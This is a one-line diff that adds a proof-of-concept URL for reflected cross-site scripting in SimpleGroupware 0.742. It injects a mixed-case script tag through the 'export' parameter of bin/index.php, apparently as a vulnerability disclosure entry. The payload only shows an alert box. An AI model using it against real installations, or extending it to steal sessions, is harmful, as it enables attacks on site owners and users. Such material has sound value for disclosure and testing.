@@ -1,0 +1,1 @@
+http://www.example.com/SimpleGroupware_0.742/bin/index.php?export=&lt;ScRiPt &gt;alert(&#039;xss&#039;)&lt;/ScRiPt&gt;
